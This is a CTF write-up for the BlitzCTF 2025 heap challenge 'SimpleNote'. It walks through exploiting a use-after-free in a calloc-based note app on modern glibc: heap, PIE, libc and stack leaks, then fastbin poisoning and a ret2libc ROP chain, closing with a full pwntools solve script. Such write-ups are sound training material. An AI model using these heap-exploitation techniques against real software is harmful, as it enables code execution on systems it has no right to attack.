# SimpleNote - BlitzCTF 2025

UAF-vulnerable note taking app that uses calloc and modern glibc

# Overview

This is a pwn challenge which has a note system, often met at heap challenges. We are given the option to create, edit, show and delete chunks. There is also a secret function which allows us to get a leak. All protections are enabled and the binary uses a modern libc version. The creation of chunks is done via calloc, which doesn't look in the tcache directly and also fills the allocated chunk with zeroes. We are also limited to 7 entries in our pointer list, which suggests that we can only have 7 chunks allocated.

# Vulnerability

The vulnerability lies in the delete function:

```c
int delete()
{
  unsigned int idx; // [rsp+4h] [rbp-Ch]
  int v2; // [rsp+Ch] [rbp-4h]

  printf("index to free: (0->%d) ", 6);
  idx = getNum();
  if ( idx > 6 || !*(&unk_4090 + 4 * idx) )
    return puts("invalid slot");
  printf("enter your guess: ");
  v2 = getNum() ^ dword_4098[8 * idx];
  if ( v2 )
    return printf("wrong guess %d\n", v2);
  free(*(&unk_4090 + 4 * idx));
  return puts("deleted");
}
```

It's a use-after-free vulnerability, the entry in the pointer list isn't removed which means that we can still interact with the chunk.

# Exploiting

In order to proceed, we need a heap, PIE, libc and stack leak. We can obtain the heap leak by printing a free'd chunk, then the PIE leak by using the secret function. We fill the tcache to start using fastbins and then allocate a chunk over the pointer list. On the pointer list, we write a pointer to a GOT entry and print it for libc leak. For stack leak, we overwrite the pointer list with environ from libc which contains a stack address. Finally, we write the return address over the list and then write our ROP payload there to get shell access.

## Setting up the environment

First, I had to extract the libc and linker from the Docker container. I just pulled the ubuntu:24.04 image (image used in Dockerfile) for linux/amd64 and transferred the required files. Then used pwninit.

## Obtaining secret values

For some reason, to edit, show or delete chunks, the program requires that we know a secret value for each entry. This can be quite easily obtained, since if the secret is wrong, the program prints us the XOR between the secret and our input. Entering 0 will print us the correct value.

## Heap leak

This is done quite easily: simply allocate a chunk, free it, read its contents, take the FD and shift it to the left by 12 bits (pointer mangling):

```python
################ Heap leak ################
create(0x30, b'A')

secrets[0] = get_secret(0)

delete(0)

fd_leak = show(0).ljust(8, b'\x00')
heap_base = unpack(fd_leak) << 12

assert heap_base > 0x100000000000, 'corrupted leak'
```


## PIE leak

The secret function looks like this:

```c
unsigned __int64 secret()
{
  void *v1; // [rsp+8h] [rbp-68h] BYREF
  char s[88]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = &unk_4060;
  puts("enter your name: ");
  fgets(s, 80, stdin);
  puts("enter your age: ");
  __isoc99_scanf("%ld", &v1);
  getchar();
  printf("your age: %ld and name: %s\n", v1, s);
  puts("but ... why you here???");
  return v3 - __readfsqword(0x28u);
}
```

If we enter "-" or "+" as the age, scanf won't write anything to the address, but it will consider it to be valid input. This way, when the age gets printed, it will give us whatever lies in there, in this case, a PIE leak:

```python
################ PIE leak ################
# secret function time
io.sendlineafter(b'> ', b'9999')
io.sendlineafter(b'enter your name: \n', b'header')
io.sendlineafter(b'enter your age: \n', b'-') # if you enter - or +, nothing gets written and scanf considers the input to be valid

io.readuntil(b'your age: ')
elf_leak = int(io.readuntil(b' ')[:-1])
elf_base = elf_leak - 0x4060

assert elf_base > 0x100000000000, 'corrupted leak'

elf.address = elf_base
```

## Fill tcache

The program uses calloc to allocate chunks:

```c
*(v3 + 2) = calloc(1uLL, v1);
```

If you take a look at what the \_\_libc_calloc function is doing in glibc 2.39, you will see that it doesn't look for chunks in tcache like \_\_libc_malloc does. Calloc directly runs \_int\_malloc (same function used by malloc, after checking tcache). In \_int\_malloc, we have the rest of the code that manages the fastbins, unsorted bins, small bins and large bins.

You can see the malloc source code for glibc 2.39 [here](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c)

The functions you want to look at are \_\_libc_malloc, \_\_libc_calloc and \_int\_malloc.

This took me some time to figure out, and I would be very confused as to why I kept getting new allocations instead of my free chunks from tcache.

However, tcache for each thread has a limit by default, 7 chunks. After the tcache is filled, \_int\_malloc will be called which will start looking for chunks in other bins depending on your context. We can allocate chunks of 80 bytes at most, so we do not have to worry about any bin other than fastbins.

We are also limited to 7 allocations. If we try to allocate again after having filled the pointer list, we will get "No space left" message. This can be easily bypassed. We use the UAF vulnerability to overwrite the tcache key, a random value next to the FD in free tcache chunks that is used to check if the chunk is already free. This is a mitigation for double free vulnerabilities in tcache, however useless in our case in which we have UAF. Once we have overwritten it, we free the chunk again. We do this over and over on the same chunk (using only 1 entry of the pointer list) until tcache is filled:

```python
################ Fill tcache ################
# Since calloc is used (which doesn't take chunks from the tcache directly), we need to fill the tcache to
# start using fastbins.
# Because we are limited to 7 chunks, we are going to abuse UAF to overwrite tcache keys and then
# do multiple frees on the already free'd chunks
for i in range(6):
    edit(0, b'A' * 16) # overwrite tcache key as well
    delete(0)
```

## Allocate over pointer list

Now that the program uses fastbins, we can fake FD with the UAF vulnerability. Just like tcache, fastbins also has safe-linking in this version. The FD pointer is mangled and the chunk must be aligned to 16 bytes. Not only, fastbins has an annoying mitigation, the metadata size field must be correct. If we allocate a chunk of size 0x30 and it takes it from the fastbin, the size field from the metadata (which is located 8 bytes before the user data) must have a value ranging from 0x40 to 0x4f. The last 4 bits aren't evaluated ([see this](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L1390)). The program actually helps us by placing the size of any chunk we allocate, in the pointer list:

```c
sz = getNum();
if ( sz <= 0 || sz > 80LL )
	return puts("invalid size");
*(v3 + 1) = sz;
*(v3 + 2) = calloc(1uLL, sz);
```

We will create a chunk of size 0x40 so that 0x40 gets placed in the pointer list, then we will allocate our chunk with the size field in the metadata right over that number. This way, we will have a chunk over pointer list while also passing the size check:

```python
################ Get chunk over pointer list ################
# Use the UAF to overwrite fastbin fd, also make sure to make it aligned and have the correct size in metadata
# We also need smaller chunks so that calloc doesn't zero out too much
# Notice how the size is also smaller than what we could've allocated. That is so that calloc doesn't zero out too much.
create(0x30, b'A')

secrets[1] = get_secret(1)

delete(1)

create(0x40, b'A') # create a chunk of size 0x40, because the program places the size in the pointer list and we need it
# to pass fastbin size and alignment check

# program places size in pointer array, we use that to pass fastbin size check, as well as the alignment requirement
ptr_list = elf.address + 0x40c0

edit(1, pack(mangle_ptr(heap_base + 0x2f0, ptr_list)))

create(0x30, b'B')
```

Next 0x30 allocation will return the pointer list.

## Libc leak

We place a pointer to a GOT entry in the list and then print it for libc leak:

```python
################ Leak libc by printing content of GOT entry ################
# We write a pointer to a GOT entry over the pointer list, when we print it, it will give us its content (libc address)
create(0x30, pack(elf.got['puts']))

secrets[2] = b'0'

libc_leak = unpack(show(2).ljust(8, b'\x00'))

assert libc_leak > 0x100000000000, 'corrupted leak'

libc.address = libc_leak - libc.sym['puts']

print(f'Libc base: {hex(libc.address)}')
```

## Stack leak

Now we will place environ from glibc in the list. Environ contains a stack address at which the environment variables are stored:

```python
################ Stack leak ################
# Now that we have libc base, we can place environ on the pointer list which contains a stack address
secrets[4] = get_secret(4)

edit(4, pack(libc.sym['environ']))

stack_leak = unpack(show(2).ljust(8, b'\x00'))

assert stack_leak > 0x100000000000, 'corrupted leak'

print(f'Stack leak: {hex(stack_leak)}')
```

## ROP

Now with a stack and libc leak, it's very easy to just do ret2libc for shell. Simply place the return address in the pointer list and write the ROP payload there:

```python
################ ROP ################
# With stack leak, we can now write a pointer to the return address over the pointer list
# Then we can write our ROP payload to that pointer
return_address = stack_leak - 0x170 + 0x20

edit(4, pack(return_address))

pop_rdi = libc.address + 0x10f75b
str_bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
ret = elf.address + 0x0000000000001016

payload = pack(pop_rdi)
payload += pack(str_bin_sh)
payload += pack(ret)
payload += pack(system)

edit(2, payload)

io.readline()

################ Shell ################
print('Enjoy shell')

io.interactive()
```

# Full solve script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

def conn():
    if args.REMOTE:
        io = remote("pwn.blitzhack.xyz", 4566)
    else:
        io = process([elf.path])
        if args.GDB:
            gdb.attach(io)

    return io

io = conn()

secrets = {}

def mangle_ptr(addr, target):
    return (addr >> 12) ^ target

def get_secret(idx : int):
    # for some reason, the program has a secret that is required
    # to be known for each entry
    # this can be easily leaked by entering 0, this gets xored with
    # the secret and then printed (leaking it)
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index to edit: ', str(idx).encode())
    io.sendlineafter(b'enter your guess: ', b'0')
    io.readuntil(b'wrong guess ')
    return io.readline()[:-1]

def create(sz : int, data : bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'enter size your note: ', str(sz).encode())
    io.sendafter(b'enter data: ', data)

def edit(idx : int, data : bytes):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index to edit: ', str(idx).encode())
    io.sendlineafter(b'enter your guess: ', secrets[idx])
    io.sendafter(b'enter data: ', data)

def show(idx : int):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index to show', str(idx).encode())
    io.sendlineafter(b'enter your guess: ', secrets[idx])
    io.readuntil(b'data: "')
    return io.readline()[:-2]

def delete(idx : int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'index to free: ', str(idx).encode())
    io.sendlineafter(b'enter your guess: ', secrets[idx])
    
"""
Heap leak with UAF
PIE leak with "-" or "+" for scanf %d input in secret function
Fill tcache (because calloc doesn't use that), use UAF to overwrite tcache keys and free the same chunk over and over to bypass chunk limit
Overwrite fastbin FD to allocate it on the pointer array (chunk sizes are also placed there, this helps us bypass fastbin size check)
Write GOT address on pointer array and print it for libc leak
Write libc environ on pointer array and print it for stack leak
Write stack return address on pointer array to edit it and place your ROP payload
ROP on libc
Enjoy!
"""

################ Heap leak ################
create(0x30, b'A')

secrets[0] = get_secret(0)

delete(0)

fd_leak = show(0).ljust(8, b'\x00')
heap_base = unpack(fd_leak) << 12

assert heap_base > 0x100000000000, 'corrupted leak'

################ PIE leak ################
# secret function time
io.sendlineafter(b'> ', b'9999')
io.sendlineafter(b'enter your name: \n', b'header')
io.sendlineafter(b'enter your age: \n', b'-') # if you enter - or +, nothing gets written and scanf considers the input to be valid

io.readuntil(b'your age: ')
elf_leak = int(io.readuntil(b' ')[:-1])
elf_base = elf_leak - 0x4060

assert elf_base > 0x100000000000, 'corrupted leak'

elf.address = elf_base

################ Fill tcache ################
# Since calloc is used (which doesn't take chunks from the tcache directly), we need to fill the tcache to
# start using fastbins.
# Because we are limited to 7 chunks, we are going to abuse UAF to overwrite tcache keys and then
# do multiple frees on the already free'd chunks
for i in range(6):
    edit(0, b'A' * 16) # overwrite tcache key as well
    delete(0)


################ Get chunk over pointer list ################
# Use the UAF to overwrite fastbin fd, also make sure to make it aligned and have the correct size in metadata
# We also need smaller chunks so that calloc doesn't zero out too much
# Notice how the size is also smaller than what we could've allocated. That is so that calloc doesn't zero out too much.
create(0x30, b'A')

secrets[1] = get_secret(1)

delete(1)

create(0x40, b'A') # create a chunk of size 0x40, because the program places the size in the pointer list and we need it
# to pass fastbin size and alignment check

# program places size in pointer array, we use that to pass fastbin size check, as well as the alignment requirement
ptr_list = elf.address + 0x40c0

edit(1, pack(mangle_ptr(heap_base + 0x2f0, ptr_list)))

create(0x30, b'B')

################ Leak libc by printing content of GOT entry ################
# We write a pointer to a GOT entry over the pointer list, when we print it, it will give us its content (libc address)
create(0x30, pack(elf.got['puts']))

secrets[2] = b'0'

libc_leak = unpack(show(2).ljust(8, b'\x00'))

assert libc_leak > 0x100000000000, 'corrupted leak'

libc.address = libc_leak - libc.sym['puts']

print(f'Libc base: {hex(libc.address)}')

################ Stack leak ################
# Now that we have libc base, we can place environ on the pointer list which contains a stack address
secrets[4] = get_secret(4)

edit(4, pack(libc.sym['environ']))

stack_leak = unpack(show(2).ljust(8, b'\x00'))

assert stack_leak > 0x100000000000, 'corrupted leak'

print(f'Stack leak: {hex(stack_leak)}')

################ ROP ################
# With stack leak, we can now write a pointer to the return address over the pointer list
# Then we can write our ROP payload to that pointer
return_address = stack_leak - 0x170 + 0x20

edit(4, pack(return_address))

pop_rdi = libc.address + 0x10f75b
str_bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
ret = elf.address + 0x0000000000001016

payload = pack(pop_rdi)
payload += pack(str_bin_sh)
payload += pack(ret)
payload += pack(system)

edit(2, payload)

io.readline()

################ Shell ################
print('Enjoy shell')

io.interactive()
```

# Enjoy

![[image_shell.png]]

# Flag

```Blitz{f4stb1n_dr1ll_thr0ugh_m3m0ry_b4rr13r}```

# Final thoughts

Despite the fact that I didn't have so much experience with heap challenges, especially on modern glibc versions, this was still very fun to me. I kept running from one problem into another and learned many new things in the process of solving each of them. This is why I really wanted to make a detailed writeup about it.
